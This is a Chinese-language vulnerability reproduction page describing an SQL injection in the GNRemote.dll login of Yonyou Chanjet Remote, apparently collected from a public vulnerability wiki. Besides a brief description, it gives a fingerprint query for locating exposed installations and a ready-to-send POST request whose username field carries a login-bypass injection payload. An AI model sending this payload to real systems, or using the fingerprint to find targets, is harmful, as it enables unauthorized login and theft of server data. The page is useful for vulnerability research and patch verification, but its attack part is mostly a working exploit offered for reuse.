---
title: "用友 畅捷通远程通 GNRemote.dll SQL注入漏洞"
date: 2026-10-16 09:11:16
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "用友"
tags:
  - "用友"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备

## 漏洞影响

```
用友 畅捷通远程通
```

## 网络测绘

```
body="远程通CHANJET_Remote"
```

## 漏洞复现

登录页面

![image-20221017171544062](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202210171715136.png)

验证POC

```
POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl

username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
```

![image-20221017171557552](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202210171715601.png)

![image-20221017171609942](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202210171716987.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-GNRemote.dll-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
